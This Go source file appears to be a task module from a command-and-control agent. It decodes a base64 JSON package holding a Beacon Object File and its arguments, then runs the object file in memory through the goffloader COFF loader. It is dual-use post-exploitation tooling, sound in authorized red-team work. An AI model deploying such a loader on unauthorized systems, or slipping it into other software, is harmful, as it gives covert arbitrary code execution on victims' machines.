package tasks

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"strings"

	"github.com/praetorian-inc/goffloader/src/coff"
)

type ModuleParams struct {
	File    string `json:"File"`
	HexData string `json:"HexData"`
}

func ProcessJSONToArgs(jsonData string) ([]byte, []byte, error) {
	jsonData = strings.ReplaceAll(jsonData, "'", "\"")

	var params ModuleParams
	err := json.Unmarshal([]byte(jsonData), &params)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to parse JSON: %w", err)
	}

	fileData, err := base64.StdEncoding.DecodeString(params.File)
	if err != nil {
		log.Printf("Warning: invalid base64 File data, proceeding with empty bytes: %v", err)
		fileData = []byte{}
	}

	hexdata, err := base64.StdEncoding.DecodeString(params.HexData)
	args, _ := hex.DecodeString(string(hexdata))

	return fileData, args, nil
}

func Execute_bof(data []byte) string {
	jsonInput, _ := base64.StdEncoding.DecodeString(string(data))

	bofBytes, argsBytes, err := ProcessJSONToArgs(string(jsonInput))
	if err != nil {
		return fmt.Sprintf("Error processing JSON: %v", err)
	}

	output, err := coff.Load(bofBytes, argsBytes)
	if err != nil {
		return fmt.Sprintf("Error loading BOF: %v", err)
	}

	return output
}
